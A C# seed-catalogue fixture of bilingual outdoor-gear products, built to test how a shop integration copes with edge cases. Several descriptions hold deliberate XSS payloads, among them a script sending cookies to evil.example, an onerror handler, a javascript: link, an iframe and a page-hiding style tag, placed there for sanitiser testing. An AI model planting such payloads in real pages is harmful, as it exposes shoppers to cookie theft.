namespace KestrelOutfitters.StandIn.Catalogue;

/// <summary>
/// First-run catalogue. Covers what the contract says Lumen must cope with: all seven mapped groups plus an
/// unmapped one (GLOVES), inactive products, German-only and English-only names, no pictures or only a thumb,
/// prices above 1.000,00 EUR, stock at 0 (with and without a restock date), 1 to 5 and plenty, and
/// descriptions with unsafe HTML (script, event handlers, javascript: links, iframes, style).
/// K-7731 and K-7732 match the samples in the published contract.
/// </summary>
internal static class SeedCatalogue
{
    public static IReadOnlyList<Product> Products() =>
    [
        // SOCKS
        new()
        {
            Ref = "K-7731", Group = "SOCKS", PriceEur = 14.95m, Units = 3, HasThumb = true, HasLarge = true,
            NameDe = "Merino Wandersocken", NameEn = "Merino Trail Socks",
            DescEn = "<p>Cushioned merino socks for <b>long days</b> on the trail.</p>",
            Specs = [new("Colour", "Charcoal"), new("Size", "M"), new("Material", "Merino wool")],
        },
        new()
        {
            Ref = "K-7732", Group = "SOCKS", PriceEur = 12.50m, Units = 0, RestockDate = new(2026, 12, 1), HasThumb = true, HasLarge = true,
            NameDe = "Trekkingsocken Coolmax", NameEn = "Coolmax Trekking Socks",
            DescDe = "<p>Schnell trocknende Socken mit <strong>Polsterung an Ferse und Zehen</strong>.</p>",
            DescEn = "<p>Quick-drying socks with <strong>padding at heel and toe</strong>.</p>",
            Specs = [new("Colour", "Navy"), new("Size", "L"), new("Material", "Coolmax polyester")],
        },
        new()
        {
            Ref = "K-7733", Group = "SOCKS", PriceEur = 24.90m, Units = 40, HasThumb = true, HasLarge = true,
            NameDe = "Kompressionssocken Sport",
            DescDe = "<p>Abgestufte Kompression für mehr Ausdauer bei Bergläufen.</p><ul><li>Anatomische Passform</li><li>Flache Nähte</li></ul>",
            Specs = [new("Colour", "Schwarz"), new("Size", "S")],
        },
        new()
        {
            Ref = "K-7734", Group = "SOCKS", PriceEur = 9.95m, Units = 14, Active = false, HasThumb = true,
            NameDe = "Wollsocken für Kinder", NameEn = "Kids' Wool Socks",
            DescEn = "<p>Soft wool socks for small feet. <em>Sold in pairs.</em></p>",
            Specs = [new("Colour", "Red"), new("Size", "31-34")],
        },
        new()
        {
            Ref = "K-7735", Group = "SOCKS", PriceEur = 17.50m, Units = 12,
            NameDe = "Seiden-Liner-Socken", NameEn = "Silk Liner Socks",
            DescDe = "<p>Dünne Innensocke gegen Blasen.</p>",
            DescEn = "<p>Thin liner sock that helps prevent blisters.</p>",
            Specs = [new("Colour", "Natural"), new("Material", "Silk")],
        },

        // JACKETS
        new()
        {
            Ref = "K-7741", Group = "JACKETS", PriceEur = 289.00m, Units = 4, HasThumb = true, HasLarge = true,
            NameDe = "Hardshelljacke Gipfelgrat", NameEn = "Summit Ridge Hardshell Jacket",
            DescDe = "<h3>Für Grate und Gipfel</h3><p>Dreilagige Membran, helmkompatible Kapuze, Unterarmbelüftung.</p>",
            Specs = [new("Colour", "Glacier Blue"), new("Size", "L"), new("Waterproof rating", "28.000 mm")],
        },
        new()
        {
            Ref = "K-7742", Group = "JACKETS", PriceEur = 349.00m, Units = 0, RestockDate = new(2027, 1, 15), HasThumb = true, HasLarge = true,
            NameDe = "Daunenjacke Polarnacht", NameEn = "Polar Night Down Jacket",
            DescEn = "<p>800 fill-power goose down for nights well below freezing.</p>"
                + "<script>document.location='https://evil.example/steal?c='+document.cookie</script>",
            Specs = [new("Colour", "Black"), new("Size", "M"), new("Fill", "800 cuin goose down")],
        },
        new()
        {
            Ref = "K-7743", Group = "JACKETS", PriceEur = 179.95m, Units = 8, HasThumb = true, HasLarge = true,
            NameDe = "Softshelljacke Föhn",
            DescDe = "<p>Winddicht, atmungsaktiv und elastisch &ndash; ideal für Skitouren.</p>",
            Specs = [new("Colour", "Moosgrün"), new("Size", "M")],
        },
        new()
        {
            Ref = "K-7744", Group = "JACKETS", PriceEur = 119.00m, Units = 25, HasThumb = true,
            NameDe = "Leichte Regenjacke", NameEn = "Lightweight Rain Jacket",
            DescDe = "<p>Nur 210&nbsp;g und klein verpackbar.</p>",
            DescEn = "<p>Just 210&nbsp;g and packs into its own pocket.</p>",
            Specs = [new("Colour", "Signal Orange"), new("Size", "S"), new("Weight", "210 g")],
        },
        new()
        {
            Ref = "K-7745", Group = "JACKETS", PriceEur = 1249.00m, Units = 2, HasThumb = true, HasLarge = true,
            NameDe = "Expeditionsparka Arktis", NameEn = "Arctic Expedition Parka",
            DescDe = "<p>Für Expeditionen bis &minus;50&nbsp;°C.</p>",
            DescEn = "<p>Built for expeditions down to &minus;50&nbsp;°C, with a <b>fur-free ruff</b> and eight pockets.</p>",
            Specs = [new("Colour", "Red"), new("Size", "XL"), new("Fill", "Goose down")],
        },

        // BOOTS
        new()
        {
            Ref = "K-7751", Group = "BOOTS", PriceEur = 219.00m, Units = 6, HasThumb = true, HasLarge = true,
            NameDe = "Wanderstiefel Alpin", NameEn = "Alpine Hiking Boots",
            DescEn = "<p>Leather hiking boots with a Vibram sole.</p><table><tr><th>Weight</th><td>1.4 kg</td></tr></table>",
            Specs = [new("Colour", "Brown"), new("Size", "EU 43"), new("Material", "Nubuck leather")],
        },
        new()
        {
            Ref = "K-7752", Group = "BOOTS", PriceEur = 489.00m, Units = 1, HasThumb = true, HasLarge = true,
            NameDe = "Hochtourenstiefel", NameEn = "High-Alpine Mountaineering Boots",
            DescDe = "<p>Steigeisenfest (Kategorie C).</p>",
            DescEn = "<p>Fully crampon-compatible (category C).</p><img src=\"x\" onerror=\"alert('kestrel')\">",
            Specs = [new("Colour", "Yellow"), new("Size", "EU 44")],
        },
        new()
        {
            Ref = "K-7753", Group = "BOOTS", PriceEur = 139.90m, Units = 30, HasThumb = true, HasLarge = true,
            NameDe = "Trailrunning-Schuhe Fels",
            DescDe = "<p>Griffige Sohle für nasse Felsen.</p>",
            Specs = [new("Colour", "Grau"), new("Size", "EU 42")],
        },
        new()
        {
            Ref = "K-7754", Group = "BOOTS", PriceEur = 189.00m, Units = 0, Active = false, HasThumb = true, HasLarge = true,
            NameDe = "Winterstiefel Schneegrat", NameEn = "Insulated Snow Boots",
            DescEn = "<p>Warm-lined boots, rated to &minus;30&nbsp;°C.</p>",
            Specs = [new("Colour", "Black"), new("Size", "EU 41")],
        },
        new()
        {
            Ref = "K-7755", Group = "BOOTS", PriceEur = 129.00m, Units = 0, HasThumb = true, HasLarge = true,
            NameDe = "Barfuß-Wanderschuhe", NameEn = "Barefoot Hiking Shoes",
            DescDe = "<p>Flexible Sohle, breite Zehenbox.</p>",
            DescEn = "<p>Flexible sole, wide toe box.</p>",
            Specs = [new("Colour", "Olive"), new("Size", "EU 40")],
        },

        // PACKS
        new()
        {
            Ref = "K-7761", Group = "PACKS", PriceEur = 79.95m, Units = 50, HasThumb = true, HasLarge = true,
            NameDe = "Tagesrucksack 22 L", NameEn = "22 L Daypack",
            DescEn = "<p>Everyday pack with a <b>ventilated back panel</b>.</p><ul><li>Hydration sleeve</li><li>Rain cover</li></ul>",
            Specs = [new("Colour", "Teal"), new("Capacity", "22 L")],
        },
        new()
        {
            Ref = "K-7762", Group = "PACKS", PriceEur = 249.00m, Units = 3, HasThumb = true, HasLarge = true,
            NameDe = "Trekkingrucksack 65 L", NameEn = "65 L Trekking Pack",
            DescDe = "<p>Verstellbares Tragesystem für Mehrtagestouren.</p>",
            DescEn = "<p>Adjustable harness for multi-day treks. <a href=\"javascript:alert(document.domain)\">Size chart</a></p>",
            Specs = [new("Colour", "Charcoal"), new("Capacity", "65 L"), new("Weight", "2.1 kg")],
        },
        new()
        {
            Ref = "K-7763", Group = "PACKS", PriceEur = 34.50m, Units = 15,
            NameDe = "Hüfttasche Pfad",
            DescDe = "<p>Für Schlüssel, Handy und Riegel.</p>",
            Specs = [new("Colour", "Sand"), new("Capacity", "2 L")],
        },
        new()
        {
            Ref = "K-7764", Group = "PACKS", PriceEur = 159.00m, Units = 0, RestockDate = new(2026, 12, 10), HasThumb = true, HasLarge = true,
            NameDe = "Kletterrucksack 35 L", NameEn = "35 L Climbing Pack",
            DescEn = "<p>Rope strap, ice-axe loops and a haul loop.</p>",
            Specs = [new("Colour", "Orange"), new("Capacity", "35 L")],
        },
        new()
        {
            Ref = "K-7765", Group = "PACKS", PriceEur = 89.00m, Units = 6, Active = false, HasThumb = true, HasLarge = true,
            NameDe = "Trinkweste 8 L", NameEn = "8 L Hydration Vest",
            DescEn = "<p>Running vest with two soft flasks.</p>",
            Specs = [new("Colour", "Lime"), new("Material", "Recycled nylon & mesh")],
        },

        // TENTS
        new()
        {
            Ref = "K-7771", Group = "TENTS", PriceEur = 399.00m, Units = 2, HasThumb = true, HasLarge = true,
            NameDe = "Ultraleichtzelt Solo", NameEn = "Ultralight Solo Tent",
            DescDe = "<p>Einwandzelt mit nur 890&nbsp;g.</p>",
            DescEn = "<p>Single-wall tent at just 890&nbsp;g.</p>",
            Specs = [new("Colour", "Green"), new("Sleeps", "1"), new("Weight", "890 g")],
        },
        new()
        {
            Ref = "K-7772", Group = "TENTS", PriceEur = 459.00m, Units = 7, HasThumb = true, HasLarge = true,
            NameDe = "Kuppelzelt 3 Personen", NameEn = "3-Person Dome Tent",
            DescEn = "<p>Freestanding dome with two porches.</p><iframe src=\"https://evil.example/frame\" width=\"600\" height=\"400\"></iframe>",
            Specs = [new("Colour", "Yellow"), new("Sleeps", "3")],
        },
        new()
        {
            Ref = "K-7773", Group = "TENTS", PriceEur = 1899.00m, Units = 1, HasThumb = true, HasLarge = true,
            NameDe = "Expeditionszelt Basislager", NameEn = "Base Camp Expedition Tent",
            DescDe = "<p>Sturmfest bis 120&nbsp;km/h.</p>",
            DescEn = "<p>Storm-proof to 120&nbsp;km/h, with room for four and their kit.</p>",
            Specs = [new("Colour", "Orange"), new("Sleeps", "4"), new("Weight", "6.8 kg")],
        },
        new()
        {
            Ref = "K-7774", Group = "TENTS", PriceEur = 69.90m, Units = 20, HasThumb = true,
            NameEn = "Ultralight Tarp 3 x 3 m",
            DescEn = "<p>Silnylon tarp with 16 guy points.</p>",
            Specs = [new("Colour", "Coyote"), new("Weight", "420 g")],
        },
        new()
        {
            Ref = "K-7775", Group = "TENTS", PriceEur = 649.00m, Units = 0, RestockDate = new(2027, 3, 1), Active = false, HasThumb = true, HasLarge = true,
            NameDe = "Familienzelt Lichtung",
            DescDe = "<p>Tunnelzelt mit zwei Schlafkabinen und Stehhöhe.</p>",
            Specs = [new("Colour", "Grün"), new("Sleeps", "6")],
        },

        // LAMPS
        new()
        {
            Ref = "K-7781", Group = "LAMPS", PriceEur = 49.95m, Units = 60, HasThumb = true, HasLarge = true,
            NameDe = "Stirnlampe 400 lm", NameEn = "400 lm Headlamp",
            DescEn = "<p onclick=\"alert(1)\">Rechargeable headlamp with red light mode.</p>",
            Specs = [new("Colour", "Black"), new("Brightness", "400 lm"), new("Battery", "USB-C, 1800 mAh")],
        },
        new()
        {
            Ref = "K-7782", Group = "LAMPS", PriceEur = 39.00m, Units = 0, RestockDate = new(2026, 11, 28), HasThumb = true, HasLarge = true,
            NameDe = "LED-Campinglaterne", NameEn = "LED Camping Lantern",
            DescDe = "<p>Dimmbar, mit Powerbank-Funktion.</p>",
            DescEn = "<p>Dimmable, doubles as a power bank.</p>",
            Specs = [new("Colour", "Silver"), new("Brightness", "300 lm")],
        },
        new()
        {
            Ref = "K-7783", Group = "LAMPS", PriceEur = 29.90m, Units = 5,
            NameDe = "Alu-Taschenlampe",
            DescDe = "<p>Robustes Aluminiumgehäuse, wasserdicht nach IPX7.</p>",
            Specs = [new("Colour", "Schwarz"), new("Brightness", "250 lm")],
        },
        new()
        {
            Ref = "K-7784", Group = "LAMPS", PriceEur = 24.95m, Units = 18, HasThumb = true, HasLarge = true,
            NameDe = "Solar-Lichterkette", NameEn = "Solar String Lights",
            DescEn = "<p>Ten warm-white LEDs on a 3&nbsp;m cord.</p>",
            Specs = [new("Colour", "Warm white"), new("Length", "3 m")],
        },
        new()
        {
            Ref = "K-7785", Group = "LAMPS", PriceEur = 59.00m, Units = 3, Active = false, HasThumb = true, HasLarge = true,
            NameDe = "Gaslaterne Hütte", NameEn = "Cabin Gas Lantern",
            DescEn = "<p>Runs on standard screw-on gas cartridges.</p>",
            Specs = [new("Colour", "Green"), new("Fuel", "Butane/propane")],
        },

        // CAPS
        new()
        {
            Ref = "K-7791", Group = "CAPS", PriceEur = 29.95m, Units = 35, HasThumb = true, HasLarge = true,
            NameDe = "Merino-Beanie", NameEn = "Merino Beanie",
            DescEn = "<style>body { display: none; }</style><p>Warm, itch-free merino beanie.</p>",
            Specs = [new("Colour", "Heather Grey"), new("Size", "One size"), new("Material", "Merino wool")],
        },
        new()
        {
            Ref = "K-7792", Group = "CAPS", PriceEur = 27.50m, Units = 4, HasThumb = true, HasLarge = true,
            NameDe = "Sonnenkappe mit Nackenschutz", NameEn = "Sun Cap with Neck Flap",
            DescDe = "<p>UPF&nbsp;50+, abnehmbarer Nackenschutz.</p>",
            DescEn = "<p>UPF&nbsp;50+ with a detachable neck flap.</p>",
            Specs = [new("Colour", "Stone"), new("Size", "M/L")],
        },
        new()
        {
            Ref = "K-7793", Group = "CAPS", PriceEur = 34.00m, Units = 9, HasThumb = true,
            NameDe = "Gewachste Schirmmütze",
            DescDe = "<p>Gewachste Baumwolle, wetterfest.</p>",
            Specs = [new("Colour", "Oliv"), new("Size", "58")],
        },
        new()
        {
            Ref = "K-7794", Group = "CAPS", PriceEur = 15.95m, Units = 0, RestockDate = new(2026, 12, 5), HasThumb = true, HasLarge = true,
            NameDe = "Fleece-Stirnband", NameEn = "Fleece Headband",
            DescEn = "<p>Keeps ears warm on cold morning runs.</p>",
            Specs = [new("Colour", "Petrol"), new("Size", "One size")],
        },
        new()
        {
            Ref = "K-7795", Group = "CAPS", PriceEur = 49.00m, Units = 11,
            NameDe = "Trappermütze", NameEn = "Trapper Hat",
            DescDe = "<p>Mit Ohrenklappen und Fleecefutter.</p>",
            DescEn = "<p>With ear flaps and a fleece lining.</p>",
            Specs = [new("Colour", "Brown"), new("Size", "L")],
        },

        // GLOVES: a group Lumen's category map does not contain, so the shop must hide these.
        new()
        {
            Ref = "K-7801", Group = "GLOVES", PriceEur = 69.00m, Units = 10, HasThumb = true, HasLarge = true,
            NameDe = "Daunenfäustlinge", NameEn = "Down Mittens",
            DescEn = "<p>Expedition mittens with a removable liner.</p>",
            Specs = [new("Colour", "Red"), new("Size", "L")],
        },
        new()
        {
            Ref = "K-7802", Group = "GLOVES", PriceEur = 39.95m, Units = 0, RestockDate = new(2026, 12, 15),
            NameDe = "Softshell-Handschuhe", NameEn = "Softshell Gloves",
            DescDe = "<p>Touchscreen-fähige Fingerkuppen.</p>",
            Specs = [new("Colour", "Black"), new("Size", "M")],
        },
    ];
}
